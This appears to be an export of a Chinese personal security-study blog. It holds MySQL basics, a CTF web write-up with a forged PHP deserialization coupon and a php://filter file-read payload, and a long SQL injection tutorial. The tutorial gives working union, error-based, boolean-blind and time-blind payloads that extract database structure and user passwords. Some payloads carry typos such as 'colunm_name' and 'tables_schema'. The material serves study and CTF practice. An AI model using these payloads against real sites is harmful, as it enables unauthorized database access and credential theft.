+Oracle：功能强、收费，银行&#x2F;电信常用
+SQL Server：适配Windows，政府单位常用
+MySQL：开源免费、轻巧，校园系统&#x2F;网站主流
+
+
+2. 数据库连接操作2.1 Navicat 可视化连接
+打开 Navicat → 左上角「连接」→ 选择「MySQL」
+填写核心信息：
+主机：localhost（本地数据库）
+端口：3306（MySQL 默认端口）
+用户名：root（超级管理员）
+密码：安装 MySQL 时设置的密码
+
+
+点击「测试连接」，提示”连接成功”即完成
+双击连接名，即可查看&#x2F;操作数据库
+
+2.2 命令行连接mysql -u root -p
+
+-u：指定用户名
+-p：需要输入密码（输入时不显示，属正常现象）
+回车后输入密码，再次回车即可登录
+
+
+3. 基础信息查询-- 当前数据库SELECT DATABASE();-- 数据库版本SELECT VERSION();
+
+
+4. DDL 库与表定义4.1 数据库操作SHOW DATABASES;                -- 查看所有库USE 数据库名;                   -- 切换数据库CREATE DATABASE 库名;           -- 创建库DROP DATABASE 库名;             -- 删除库
+
+4.1.1 创建 school 数据库（指定字符集）CREATE DATABASE school CHARACTER SET utf8 COLLATE utf8_general_ci;
+
+CHARACTER SET：指定字符集
+COLLATE：指定排序规则
+
+4.2 数据表操作SHOW TABLES;                    -- 查看当前库所有表DESC 表名;                      -- 查看表结构CREATE TABLE 表名(字段 类型…);   -- 创建表DROP TABLE 表名;                -- 删除表
+
+4.2.1 创建 users 学生表USE school;CREATE TABLE users (    id INT(11) PRIMARY KEY,            -- 主键，学号（唯一标识）    name VARCHAR(50) NOT NULL,         -- 姓名，非空    id_card VARCHAR(18) NOT NULL,      -- 身份证号    phone VARCHAR(11) NOT NULL,        -- 手机号    address TEXT,                       -- 地址    password VARCHAR(255) NOT NULL     -- 密码);
+
+
+5. DML 数据操作（增删改查）5.1 插入 INSERTINSERT INTO `school`.`users` (`id`, `name`, `id_card`, `phone`, `address`, `password`)VALUES (3, &#x27;shiro&#x27;, &#x27;123456789&#x27;, &#x27;123456789&#x27;, &#x27;中国&#x27;, &#x27;123456&#x27;);
+
+INSERT INTO 表名(字段1, 字段2)：指定新增数据的表和字段
+VALUES(值1, 值2)：批量填数据，顺序与字段对应
+
+5.2 查询 SELECT-- 查所有列SELECT * FROM 表名;-- 查指定列SELECT 字段1, 字段2 FROM 表名;-- 按条件查询SELECT name, password FROM users WHERE id = 1;-- 去重SELECT DISTINCT 字段 FROM 表名;-- 排序（ASC 升序默认 / DESC 降序）SELECT name FROM users ORDER BY id;SELECT name FROM users ORDER BY name DESC;-- 分页（从 n 开始取 m 条）SELECT * FROM users LIMIT 3;SELECT * FROM users LIMIT 1, 2;
+
+5.3 修改 UPDATEUPDATE users SET password = &#x27;newpass789&#x27; WHERE id = 2;
+注意：漏写 WHERE 会修改表中所有数据。
+5.4 删除 DELETEDELETE FROM users WHERE id = 1;
+同样，漏写 WHERE 会清空整张表，且难以恢复。
+
+6. 常用条件语法6.1 运算符
+
+
+类型
+语法
+说明
+
+
+
+比较
+= &gt; &lt; &gt;= &lt;= !=
+值比较
+
+
+逻辑
+AND OR NOT
+条件组合
+
+
+范围
+BETWEEN 小 AND 大
+区间筛选
+
+
+集合
+IN(值1, 值2)
+多值匹配
+
+
+6.1.1 AND（并且）：多个条件必须同时满足SELECT name, password FROM users WHERE id = 2 AND name = &#x27;xiaolin&#x27;;
+
+6.1.2 OR（或者）：满足任一条件即可SELECT * FROM users WHERE id = 2 OR id = 3;
+
+6.2 模糊查询LIKE &#x27;%字符%&#x27;  -- % 匹配任意多个字符LIKE &#x27;_字符_&#x27;  -- _ 匹配单个字符-- 示例SELECT * FROM users WHERE name LIKE &#x27;x%&#x27;;   -- 查姓 x 的学生
+
+
+7. 聚合函数（统计）
+
+
+函数
+作用
+
+
+
+COUNT()
+统计行数
+
+
+MAX()
+最大值
+
+
+MIN()
+最小值
+
+
+SUM()
+求和
+
+
+AVG()
+平均值
+
+
+
+8. 分组与筛选GROUP BY 字段;          -- 分组HAVING 条件;            -- 分组后条件过滤
+
+
+9. 联合查询 UNION将多个 SELECT 结果合并，前提：字段数相同、字段类型兼容。
+SELECT 列1, 列2 FROM 表1UNIONSELECT 列1, 列2 FROM 表2;-- UNION：合并结果并去重-- UNION ALL：保留重复数据
+
+
+10. SQL 注入漏洞10.1 万能密码10.1.1 漏洞根源$sql = &quot;SELECT * FROM users WHERE name=&#x27;$name&#x27; AND password=&#x27;$pwd&#x27;&quot;;
+
+直接将用户输入拼接到 SQL 语句的单引号中执行
+未检查&#x2F;过滤特殊字符（如 &#39;、OR、# 等），也未做转义处理
+攻击者可输入恶意字符篡改 SQL 逻辑
+
+10.1.2 攻击原理攻击者输入 123&#39; or &#39;1&#39;=&#39;1，实现 3 个关键操作：
+
+闭合原有 SQL 语句的单引号，打破查询限制
+添加 &#39;1&#39;=&#39;1&#39; 恒成立条件，让查询条件永远为真
+注释多余内容，避免 SQL 语法错误
+
+10.1.3 篡改后的 SQL 对比原正常 SQL：
+SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27;
+
+篡改后 SQL：
+SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27; or &#x27;1&#x27;=&#x27;1&#x27;
+
+无论账号密码是否正确，数据库都会返回所有用户信息，实现免密绕过。
+SELECT * FROM users WHERE name=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;123&#x27;
+
+10.2 CTF 注入常用语句10.2.1 核心系统库：information_schemaMySQL 自带系统字典库，储存所有数据库名、表名、字段名，注入查表必备。
+
+
+
+系统表
+存储内容
+
+
+
+schemata
+所有数据库信息
+
+
+tables
+所有数据表信息
+
+
+columns
+所有字段（列）信息
+
+
+
+
+
+关键字段
+含义
+
+
+
+schema_name
+数据库名
+
+
+table_schema
+表所属的数据库
+
+
+table_name
+数据表名
+
+
+column_name
+字段（列）名
+
+
+10.2.2 常用注入语句
+查看当前库、版本
+
+SELECT DATABASE();SELECT VERSION();
+
+
+查询所有数据库
+
+SELECT schema_name FROM information_schema.schemata;
+
+
+查询当前库所有表
+
+SELECT table_name FROM information_schema.tables WHERE table_schema = database();
+
+
+查询指定表所有字段
+
+SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
+
+
+探测字段数量
+
+ORDER BY 1;ORDER BY 2;-- 不报错代表存在，报错即为最大列数
+
+
+批量拼接爆库&#x2F;表&#x2F;字段
+
+-- 爆出当前库所有表SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database();-- 爆出指定表所有字段SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
+
+
+查询表内真实数据
+
+SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
+
+
+本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>御网杯Web部分题解</title>
+    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
+    <content><![CDATA[一、WEB-Snake_Game1. 题目
+
+
+
+2. 解题思路
+题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
+F12
+
+
+
+
+添加覆盖脚本
+
+
+
+修改成功！
+
+
+
+拿到 flag
+
+
+
+
+二、WEB-PHP_Payment1. 题目
+
+2. 解题思路
+根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
+
+
+
+
+下载附件，收集信息
+
+
+
+代码审计 apply_coupon.php
+1、包含了另外两个文件
+
+
+2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
+
+
+如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁
+再看models.php 里的类
+
+
+有两个属性，一是代金券金额，一是代金券码。
+含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
+所以，目标就是，构造一个金额够买 Flag
+3、 构造 代金券
+&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
+
+
+
+TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
+
+
+
+
+
+购买 Flag，看 buy.php
+
+
+
+
+
+
+
+用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
+
+
+依据这个 调用 fetch
+fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
+
+拿到 flag
+
+
+
+
+
+三、WEB-Enterprise_OA1. 题目
+
+
+
+2. 解题思路
+根据题目提示，这题考查目录穿越、文件包含
+先尝试访问 flag.php
+
+
+
+include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
+路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
+并且服务器是：
+
+
+说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
+
+读源代码
+
+
+
+用 php 伪协议
+php://filter/read=convert.base64-encode/resource=index.php
+
+
+
+利用 base64 在线解密工具
+PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
+
+
+
+
+访问绝对路径
+
+
+
+
+访问 flag 文件
+
+比如：flag.php   flag.txt
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[1. 什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
+SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
+
+2. SQL 注入分类常见的注入点：
+?str=xxx?test=xxx?idstr=xxx?id=xxx
+
+2.1 union 注入2.1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
+2.1.2 适用条件：（1）网页存在注入点，有回显。
+（2）需要满足union语句要求，即：
+union前后两个select的结果集应具有相同列数；
+union前后两个select的结果集对应列应是相同数据类型
+2.1.3 注入步骤：
+首先判断是否存在注入点及注入的类型。
+
+https://地址/?id=1通过修改id的值判断是否存在注入点
+
+
+使用ORDER BY 查询列数
+
+https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
+
+
+判断回显的位置
+
+?id=-1 union select 1,2,3注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
+
+
+获取数据库名
+
+以三个字段数为例：
+?id=-1 union select 1,2,database()		//查询当前数据库?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
+
+
+获取数据库中的所有表名
+
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where tables_schema=&#x27;数据库名&#x27;
+
+
+获取数据库的表中的所有字段名
+
+?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where tables_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
+
+
+获取字段中的数据。
+
+?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1// 如果想要数据一一对应，使用concat将多个字段内容合并为输出// 例如：?id=-1 union select 1,2,concat(username, &#x27;:&#x27;, password) from users limit 0,1
+
+2.1.4 总结
+union 注入要求存在注入点，有回显
+需要满足 union 语句要求
+
+2.2 报错注入2.2.1 概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
+2.2.2 使用条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
+2.2.3 报错注入命令该部分参考：https://cloud.tencent.com/developer/article/2159753
+groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
+?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
+1、 命令解释
+1. `count(*)`
+
+统计有多少行数据，用来触发分组。
+2. `rand(0)`
+
+生成固定的随机数（不是真随机， predictable）
+3. `floor(rand(0)*2)`
+
+结果只有两个：0 或者 1
+4. `group by x`
+
+按 x 分组，MySQL 会建一张临时表存分组结果。
+5. `concat(0x5e, 数据, 0x5e)`
+
+把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
+- `0x5e` = **^** 符号，只是分隔符
+
+2、 问题：
+为什么会报错？
+MySQL 做 group by 时：
+
+先算 floor(rand(0)*2) → 得到 0 或 1
+把结果插入临时表
+插入时又算了一次 rand (0)
+两次结果不一样 → 出现重复键
+直接报错：Duplicate entry（重复条目）
+关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
+
+为什么 rand (14) 更好？
+rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
+3、 总结
+
+用 rand() 生成 0&#x2F;1
+用 group by 建临时表
+插入时重复计算 rand ()
+产生重复键报错
+错误信息里带出我们要的数据
+
+3、 如何使用
+不懂原理知道如何使用即可，想查什么，就把 version() 换成：
+
+database() → 查库名
+table_name → 查表名
+column_name → 查字段
+password → 查数据
+
+示例：
+?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+把想要的数据（这里是 version()）爆在报错信息里。
+xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
+只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
+extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
+
+
+作用：从 XML 里查数据。
+语法：
+
+extractvalue( XML文档, XPath路径 )
+
+updatexml()?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
+
+
+作用：修改 XML 里的数据。
+语法：
+
+updatexml( XML文档, XPath路径, 新值 )
+
+
+注意：
+
+updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：
+&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
+
+0x5e、0x5c 是什么？
+0x5e → ^
+0x5c → ____
+
+作用：破坏 XPath 语法，强制报错。
+攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;);// 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
+
+
+获得数据库名字
+
+&#x27; or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or &#x27;
+
+
+获得表名
+
+&#x27; or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or &#x27;
+
+
+获得表的字段
+
+&#x27; or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or &#x27;
+
+
+获得数据
+
+&#x27; or extractvalue(1, concat(0x5c, (select concat(字段1,&#x27;:&#x27;,字段1) from 表名 limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select concat(字段2,&#x27;:&#x27;,密码2) from 表名 limit 0,1), 0x5e), 1) or &#x27;
+
+2.3 布尔盲注2.3.1 概念当改变浏览器传给后台SQL的参数后，浏览器没有显⽰对应内容也没有显⽰报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊
+2.3.2 使用条件⼀般情况下，当带⼊参数为真和假时，⻚⾯会有不同的反映，⽐如有⽆显⽰也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。
+2.3.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
+
+判断是否存在布尔注入使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。
+
+?id=2 and 1=1?id=2 and 1=2
+
+
+猜解数据库名
+
+a. 判断库名长度
+?id=1 and length(database())&lt;数值?id=1 and length(database())&gt;数值?id=1 and length(database())=数字
+
+示例（假设数据库名为 data）：
+?id=1 and length(database())&lt;5?id=1 and length(database())&gt;2?id=1 and length(database())=4		// true 说明数据库名的长度为4
+
+b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
+
+
+数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
+?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
+
+示例（库名：data）：
+?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
+
+c. 验证库名
+?id=1 and database()=&#x27;库名&#x27;
+
+示例（库名：data）：
+?id=1 and database()=&#x27;data&#x27;
+
+
+猜解库内数据表
+
+a. 判断表数量
+?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
+
+b. 判断表名长度
+// 判断单张表?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字// 判断多张表：?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！//比如：-- 第1张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度-- 第2张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
+
+示例（表名：users）：
+?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;10?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;5?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
+
+c. 逐字符猜解表名
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&lt;ASCII值	//先判断范围?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&gt;ASCII值	?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值// 直接填爆出来的库名或者database()都可以
+
+示例（表名：users，以第一个字符 u 为例）：
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;120?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
+
+
+猜解表内字段
+
+a.  判断字段总数
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=数值
+
+更改数值，挨个测试，表名填自己想查询的表名。
+示例（假如 users 表里面有两个字段分别是 username 和  password）：
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27;)=2
+
+b. 判断字段名长度
+?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
+
+示例（查第一个字段名的长度）：
+?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;10?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;1?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))=8 // 第一个字段的长度是8个字符
+
+c. 逐字符猜字段名
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
+
+示例（以 username 为例，查第一个字符 u）：
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;110?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117
+
+
+猜解表中数据
+
+a. 判断数据长度
+?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
+
+示例：假设获得username 字段第一行数据的内容长度为 2
+?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
+
+b. 逐字符猜数据内容
+?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
+
+示例：假设获得user字段第一行数据第一个字符内容
+?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
+
+2.4 延迟盲注2.4.1 概念也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。
+2.4.2 使用条件union、报错、布尔等搞不定的时候才考虑，效率极低。
+2.4.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
+
+测试延时注入点
+
+?id=1 and sleep(秒数)
+
+示例：
+?id=1 and sleep(5)
+
+
+猜数据库名
+
+a. 判断库名长度
+?id=1 and if(length(database())=数值,sleep(5),1)
+
+示例：
+?id=1 and if(length(database())=4,sleep(5),1)
+
+b. 逐字符猜库名
+?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
+
+
+猜数据表名
+
+a. 判断表名长度
+?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
+
+示例（库名为 data，长度为 4）：
+?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
+
+b. 逐字符猜表名
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
+
+
+猜字段名
+
+a. 判断字段名长度
+?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
+
+示例
+?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1))=4,sleep(5),1)
+
+b. 逐字符猜字段
+?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1),1,1))=110,sleep(5),1)
+
+
+猜表内数据
+
+?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
+
+注解
+
+序号：表 &#x2F; 字段排序，从 0 开始计数
+位数：字符串截取位置
+sleep (5)：条件成立延迟 5 秒响应
+
